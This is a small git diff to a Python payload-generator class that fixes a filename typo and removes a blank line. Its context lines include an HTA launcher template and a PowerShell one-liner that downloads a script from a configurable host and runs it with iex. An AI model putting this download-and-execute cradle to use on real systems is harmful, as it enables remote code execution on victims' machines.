@@ -54,7 +54,7 @@ class mypayloadgen():
         self.__pexec_hta_template = "pslauncher.hta"
         self.__pexec_hta_outputname = "test.hta"
         self.__pexec_hta_payload_tag = r"%%PAYLOAD%%"
-        self.__pexec_oneliner_template = "Invoke-psonliner.ps1"
+        self.__pexec_oneliner_template = "Invoke-psoneliner.ps1"
         self.__pexec_oneliner_webrequest = "iex ((New-Object Net.WebClient).DownloadString('http://{}:{}/{}'));Invoke-myclient"
         self.__pexec_hta_filename = "Invoke-myclient.ps1"
         self.__pexec_oneliner_ip = "127.0.0.1"
@@ -74,7 +74,6 @@ class mypayloadgen():
 
     def set_injection_target(self,target):
         self.__gtojs_injection_target = target
-    
 
     def set_pexec_config(self,filename,ip,port):
         if len(filename) != 0:
